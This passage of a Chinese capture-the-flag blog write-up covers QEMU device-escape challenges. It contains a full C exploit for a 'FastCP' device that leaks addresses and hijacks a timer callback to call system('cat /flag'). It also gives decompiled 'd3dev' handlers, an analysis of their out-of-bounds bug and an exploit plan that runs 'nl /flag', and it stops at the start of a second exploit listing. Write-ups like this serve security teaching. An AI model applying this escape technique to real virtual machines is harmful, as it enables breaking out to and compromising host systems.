class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/io.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PAGE_SHIFT 12</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PAGE_SIZE (1 &lt;&lt; PAGE_SHIFT)</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">FastCP_CP_INFO</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">uint64_t</span> CP_src;</span><br><span class="line">    <span class="keyword">uint64_t</span> CP_cnt;</span><br><span class="line">    <span class="keyword">uint64_t</span> CP_dst;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">QEMUTimer</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">long</span> <span class="keyword">long</span> <span class="keyword">int</span> expire_time;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> timer_list;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> cb;</span><br><span class="line">    <span class="keyword">void</span> *opaque;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> next;</span><br><span class="line">    <span class="keyword">int</span> attributes;</span><br><span class="line">    <span class="keyword">int</span> scale;</span><br><span class="line">    <span class="keyword">char</span> command[<span class="number">0x50</span>];</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">die</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *msg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    perror(msg);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">size_t</span> <span class="title">va2pa</span><span class="params">(<span class="keyword">void</span> *addr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">uint64_t</span> data;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> fd = open(<span class="string">&quot;/proc/self/pagemap&quot;</span>, O_RDONLY);</span><br><span class="line">    <span class="keyword">if</span> (!fd)</span><br><span class="line">    &#123;</span><br><span class="line">        perror(<span class="string">&quot;open pagemap&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">size_t</span> offset = ((<span class="keyword">uintptr_t</span>)addr / PAGE_SIZE) * <span class="keyword">sizeof</span>(<span class="keyword">uint64_t</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (lseek(fd, offset, SEEK_SET) &lt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;lseek&quot;</span>);</span><br><span class="line">        close(fd);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (read(fd, &amp;data, <span class="number">8</span>) != <span class="number">8</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;read&quot;</span>);</span><br><span class="line">        close(fd);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!(data &amp; (((<span class="keyword">uint64_t</span>)<span class="number">1</span> &lt;&lt; <span class="number">63</span>))))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;page&quot;</span>);</span><br><span class="line">        close(fd);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">size_t</span> pageframenum = data &amp; ((<span class="number">1ull</span> &lt;&lt; <span class="number">55</span>) - <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">size_t</span> phyaddr = pageframenum * PAGE_SIZE + (<span class="keyword">uintptr_t</span>)addr % PAGE_SIZE;</span><br><span class="line"></span><br><span class="line">    close(fd);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> phyaddr;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> *userbuf;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> phy_userbuf;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> *mmio_mem;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">write_CP_list_cnt</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> value)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    *((<span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> *)(mmio_mem + +<span class="number">0x10</span>)) = value;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">write_CP_list_src</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> value)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    *((<span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> *)(mmio_mem + <span class="number">8</span>)) = value;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">run_cmd</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> cmd, <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> src, <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> cnt)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    write_CP_list_cnt(cnt);</span><br><span class="line">    write_CP_list_src(src);</span><br><span class="line">    *((<span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> *)(mmio_mem + +<span class="number">0x18</span>)) = cmd;</span><br><span class="line">    sleep(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> mmio_fd = open(<span class="string">&quot;/sys/bus/pci/devices/0000:00:04.0/resource0&quot;</span>, O_RDWR | O_SYNC);</span><br><span class="line">    <span class="keyword">if</span> (mmio_fd == <span class="number">-1</span>)</span><br><span class="line">        die(<span class="string">&quot;mmio_fd open failed&quot;</span>);</span><br><span class="line"></span><br><span class="line">    mmio_mem = mmap(<span class="number">0</span>, <span class="number">0x1000</span>, PROT_READ | PROT_WRITE, MAP_SHARED, mmio_fd, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (mmio_mem == MAP_FAILED)</span><br><span class="line">        die(<span class="string">&quot;mmap mmio_mem failed&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;mmio_mem @ %p\n&quot;</span>, mmio_mem);</span><br><span class="line">    userbuf = mmap(<span class="number">0</span>, <span class="number">0x2000</span>, PROT_READ | PROT_WRITE, MAP_SHARED | MAP_ANONYMOUS, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (userbuf == MAP_FAILED)</span><br><span class="line">        die(<span class="string">&quot;mmap&quot;</span>);</span><br><span class="line"></span><br><span class="line">    mlock(userbuf, <span class="number">0x2000</span>);</span><br><span class="line">    phy_userbuf = va2pa(userbuf);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;user buff virtual address: %p\n&quot;</span>, userbuf);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;user buff physical address: %p\n&quot;</span>, (<span class="keyword">void</span> *)phy_userbuf);</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">FastCP_CP_INFO</span> <span class="title">info</span>;</span></span><br><span class="line">    info.CP_src = <span class="literal">NULL</span>;</span><br><span class="line">    info.CP_dst = phy_userbuf;</span><br><span class="line">    info.CP_cnt = <span class="number">0x1000</span> + <span class="number">0x30</span>;</span><br><span class="line">    <span class="built_in">memcpy</span>(userbuf, &amp;info, <span class="keyword">sizeof</span>(info));</span><br><span class="line">    run_cmd(<span class="number">4</span>, phy_userbuf, <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    info.CP_src = phy_userbuf + <span class="number">0x1000</span>;</span><br><span class="line">    info.CP_cnt = <span class="number">0x30</span>;</span><br><span class="line">    info.CP_dst = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="built_in">memcpy</span>(userbuf, &amp;info, <span class="keyword">sizeof</span>(info));</span><br><span class="line">    run_cmd(<span class="number">2</span>, phy_userbuf, <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    info.CP_src = <span class="literal">NULL</span>;</span><br><span class="line">    info.CP_cnt = <span class="number">0x30</span>;</span><br><span class="line">    info.CP_dst = phy_userbuf;</span><br><span class="line">    <span class="built_in">memcpy</span>(userbuf, &amp;info, <span class="keyword">sizeof</span>(info));</span><br><span class="line">    run_cmd(<span class="number">4</span>, phy_userbuf, <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;fastcp_cp_timer=&gt;%p\n&quot;</span>, *(<span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> *)(userbuf + <span class="number">0x10</span>));</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%p\n&quot;</span>, va2pa(userbuf + <span class="number">0x1000</span>));</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%p\n&quot;</span>, va2pa(userbuf + <span class="number">0x2000</span>));</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> fastcp_cp_timer = *(<span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> *)(userbuf + <span class="number">0x10</span>);</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> elf_base = fastcp_cp_timer - <span class="number">0x4DCE80</span>;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> system_addr = elf_base + <span class="number">0x2C2180</span>;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> opaque_addr = *(<span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> *)(userbuf + <span class="number">0x18</span>);</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">QEMUTimer</span> <span class="title">timer</span>;</span></span><br><span class="line"></span><br><span class="line">    timer.expire_time = <span class="number">0xffffffffffffffff</span>;</span><br><span class="line">    timer.timer_list = *(<span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> *)(userbuf + <span class="number">0x8</span>);</span><br><span class="line">    timer.cb = system_addr;</span><br><span class="line">    timer.opaque = opaque_addr + <span class="number">0x1a30</span>;</span><br><span class="line">    timer.next = *(<span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> *)(userbuf + <span class="number">0x20</span>);</span><br><span class="line">    timer.attributes = *(<span class="keyword">unsigned</span> <span class="keyword">int</span> *)(userbuf + <span class="number">0x28</span>);</span><br><span class="line">    timer.scale = *(<span class="keyword">unsigned</span> <span class="keyword">int</span> *)(userbuf + <span class="number">0x2c</span>);</span><br><span class="line">    <span class="built_in">strcpy</span>(&amp;timer.command, <span class="string">&quot;cat /flag&quot;</span>);</span><br><span class="line">    <span class="built_in">memcpy</span>(userbuf + <span class="number">0x1000</span>, &amp;timer, <span class="keyword">sizeof</span>(timer));</span><br><span class="line"></span><br><span class="line">    info.CP_src = va2pa(userbuf + <span class="number">0x1000</span>) - <span class="number">0x1000</span>;</span><br><span class="line">    info.CP_cnt = <span class="number">0x1000</span> + <span class="number">0x30</span> + <span class="number">9</span>;</span><br><span class="line">    info.CP_dst = va2pa(userbuf + <span class="number">0x1000</span>) - <span class="number">0x1000</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">0x11</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">memcpy</span>(userbuf + i * <span class="number">0x18</span>, &amp;info, <span class="keyword">sizeof</span>(info));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    run_cmd(<span class="number">1</span>, phy_userbuf, <span class="number">0x11</span>);</span><br><span class="line">    *((<span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> *)(mmio_mem + +<span class="number">0x18</span>)) = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/image-20230321155543134.png"
+                      alt="image-20230321155543134"
+                ></p>
+<h2 id="d3dev"><a href="#d3dev" class="headerlink" title="d3dev"></a>d3dev</h2><p>先看看结构体</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> __<span class="title">attribute__</span>((<span class="title">aligned</span>(16))) <span class="title">d3devState</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  PCIDevice_0 pdev;</span><br><span class="line">  MemoryRegion_0 mmio;</span><br><span class="line">  MemoryRegion_0 pmio;</span><br><span class="line">  <span class="keyword">uint32_t</span> memory_mode;</span><br><span class="line">  <span class="keyword">uint32_t</span> seek;</span><br><span class="line">  <span class="keyword">uint32_t</span> init_flag;</span><br><span class="line">  <span class="keyword">uint32_t</span> mmio_read_part;</span><br><span class="line">  <span class="keyword">uint32_t</span> mmio_write_part;</span><br><span class="line">  <span class="keyword">uint32_t</span> r_seed;</span><br><span class="line">  <span class="keyword">uint64_t</span> blocks[<span class="number">257</span>];</span><br><span class="line">  <span class="keyword">uint32_t</span> key[<span class="number">4</span>];</span><br><span class="line">  <span class="keyword">int</span> (*rand_r)(<span class="keyword">unsigned</span> <span class="keyword">int</span> *);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h3 id="分析函数"><a href="#分析函数" class="headerlink" title="分析函数"></a>分析函数</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">uint64_t</span> __fastcall <span class="title">d3dev_mmio_read</span><span class="params">(d3devState *opaque, hwaddr addr, <span class="keyword">unsigned</span> <span class="keyword">int</span> size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">uint64_t</span> v3; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">int</span> v4; <span class="comment">// esi</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v5; <span class="comment">// ecx</span></span><br><span class="line">  <span class="keyword">uint64_t</span> result; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  v3 = opaque-&gt;blocks[opaque-&gt;seek + (addr &gt;&gt; <span class="number">3</span>)];</span><br><span class="line">  v4 = <span class="number">0xC6EF3720</span>;</span><br><span class="line">  v5 = v3;</span><br><span class="line">  result = HIDWORD(v3);</span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">  &#123;</span><br><span class="line">    LODWORD(result) = result - ((v5 + v4) ^ (opaque-&gt;key[<span class="number">3</span>] + (v5 &gt;&gt; <span class="number">5</span>)) ^ (opaque-&gt;key[<span class="number">2</span>] + <span class="number">16</span> * v5));</span><br><span class="line">    v5 -= (result + v4) ^ (opaque-&gt;key[<span class="number">1</span>] + (result &gt;&gt; <span class="number">5</span>)) ^ (opaque-&gt;key[<span class="number">0</span>] + <span class="number">16</span> * result);</span><br><span class="line">    v4 += <span class="number">0x61C88647</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> ( v4 );</span><br><span class="line">  <span class="keyword">if</span> ( opaque-&gt;mmio_read_part )</span><br><span class="line">  &#123;</span><br><span class="line">    opaque-&gt;mmio_read_part = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    opaque-&gt;mmio_read_part = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">return</span> v5;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><code>mmio_read</code>函数这里，首先是根据seek和addr定位到数据，随后将数据进行tea解密，然后第一次输出低32位，第二次输出高32位。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> __fastcall <span class="title">d3dev_mmio_write</span><span class="params">(d3devState *opaque, hwaddr addr, <span class="keyword">uint64_t</span> val, <span class="keyword">unsigned</span> <span class="keyword">int</span> size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 v4; <span class="comment">// rsi</span></span><br><span class="line">  ObjectClass **v5; <span class="comment">// r11</span></span><br><span class="line">  <span class="keyword">uint64_t</span> v6; <span class="comment">// rdx</span></span><br><span class="line">  <span class="keyword">int</span> v7; <span class="comment">// esi</span></span><br><span class="line">  <span class="keyword">uint32_t</span> v8; <span class="comment">// r10d</span></span><br><span class="line">  <span class="keyword">uint32_t</span> v9; <span class="comment">// r9d</span></span><br><span class="line">  <span class="keyword">uint32_t</span> v10; <span class="comment">// r8d</span></span><br><span class="line">  <span class="keyword">uint32_t</span> v11; <span class="comment">// edi</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v12; <span class="comment">// ecx</span></span><br><span class="line">  <span class="keyword">uint64_t</span> v13; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( size == <span class="number">4</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v4 = opaque-&gt;seek + (addr &gt;&gt; <span class="number">3</span>);</span><br><span class="line">    <span class="keyword">if</span> ( opaque-&gt;mmio_write_part )</span><br><span class="line">    &#123;</span><br><span class="line">      v5 = &amp;opaque-&gt;pdev.qdev.parent_obj.class + v4;</span><br><span class="line">      v6 = val &lt;&lt; <span class="number">32</span>;</span><br><span class="line">      v7 = <span class="number">0</span>;</span><br><span class="line">      opaque-&gt;mmio_write_part = <span class="number">0</span>;</span><br><span class="line">      v8 = opaque-&gt;key[<span class="number">0</span>];</span><br><span class="line">      v9 = opaque-&gt;key[<span class="number">1</span>];</span><br><span class="line">      v10 = opaque-&gt;key[<span class="number">2</span>];</span><br><span class="line">      v11 = opaque-&gt;key[<span class="number">3</span>];</span><br><span class="line">      v12 = v6 + *(v5 + <span class="number">0x2B6</span>);</span><br><span class="line">      v13 = (v5[<span class="number">0x15B</span>] + v6) &gt;&gt; <span class="number">32</span>;</span><br><span class="line">      <span class="keyword">do</span></span><br><span class="line">      &#123;</span><br><span class="line">        v7 -= <span class="number">0x61C88647</span>;</span><br><span class="line">        v12 += (v7 + v13) ^ (v9 + (v13 &gt;&gt; <span class="number">5</span>)) ^ (v8 + <span class="number">16</span> * v13);</span><br><span class="line">        LODWORD(v13) = ((v7 + v12) ^ (v11 + (v12 &gt;&gt; <span class="number">5</span>)) ^ (v10 + <span class="number">16</span> * v12)) + v13;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">while</span> ( v7 != <span class="number">0xC6EF3720</span> );</span><br><span class="line">      v5[<span class="number">0x15B</span>] = __PAIR64__(v13, v12);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      opaque-&gt;mmio_write_part = <span class="number">1</span>;</span><br><span class="line">      opaque-&gt;blocks[v4] = val;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>在<code>mmio_write</code>函数中首先一样先通过seek和addr得到index，第一次使用时是直接在低32位写入输入的数据，后面的则是低32位和高32位进行tea加密随后写入到地址位置。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// local variable allocation has failed, the output may be wrong!</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> __fastcall <span class="title">d3dev_pmio_write</span><span class="params">(d3devState *opaque, hwaddr addr, <span class="keyword">uint64_t</span> val, <span class="keyword">unsigned</span> <span class="keyword">int</span> size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">uint32_t</span> *key; <span class="comment">// rbp</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( addr == <span class="number">8</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( val &lt;= <span class="number">0x100</span> )</span><br><span class="line">      opaque-&gt;seek = val;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> ( addr &gt; <span class="number">8</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( addr == <span class="number">28</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      opaque-&gt;r_seed = val;</span><br><span class="line">      key = opaque-&gt;key;</span><br><span class="line">      <span class="keyword">do</span></span><br><span class="line">        *key++ = (opaque-&gt;rand_r)(&amp;opaque-&gt;r_seed, <span class="number">28LL</span>, val, *&amp;size);</span><br><span class="line">      <span class="keyword">while</span> ( key != &amp;opaque-&gt;rand_r );</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> ( addr )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( addr == <span class="number">4</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      *opaque-&gt;key = <span class="number">0LL</span>;</span><br><span class="line">      *&amp;opaque-&gt;key[<span class="number">2</span>] = <span class="number">0LL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    opaque-&gt;memory_mode = val;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这里不说<code>pmio_read</code>函数了，因为确实没啥用就不浪费篇幅了。这里看<code>pmio_write</code>函数，可以喊到在port等于28时会给<code>r_seek</code>赋值，并且会调用<code>opaque-&gt;rand_r</code>第一个参数就是<code>opaque-&gt;r_seed</code>的地址。而在addr等于8并且val小于0x100时则是往seek中写入值。可以看出来这里漏洞一样是存在越界使用结构体。</p>
+<h3 id="利用分析-1"><a href="#利用分析-1" class="headerlink" title="利用分析"></a>利用分析</h3><p>这里的利用思路也是较为清晰的</p>
+<ol>
+<li>  首先修改seek配合addr实现使用<code>mmio_write</code>函数实现越界写，将<code>opaque-&gt;rand_r</code>原有的函数地址进行tea加密并且写入到当前位置。</li>
+<li>  两次调用<code>mmio_read</code>函数，分别读取<code>opaque-&gt;rand_r</code>高位和低位泄漏出libc地址，进而拿到system地址。</li>
+<li>  应为<code>r_seek</code>成员和<code>blocks</code>成员紧邻的缘故，恢复seek为0并通过addr在<code>blocks</code>成员开始位置写入<code>flag</code></li>
+<li>  最后直接调用<code>pmio_write</code>并且port为28修改<code>r_seed</code>为<code>nl /</code>即可调用<code>nl /flag</code></li>
+</ol>
+<h3 id="综上，exp-1"><a href="#综上，exp-1" class="headerlink" title="综上，exp"></a>综上，exp</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span 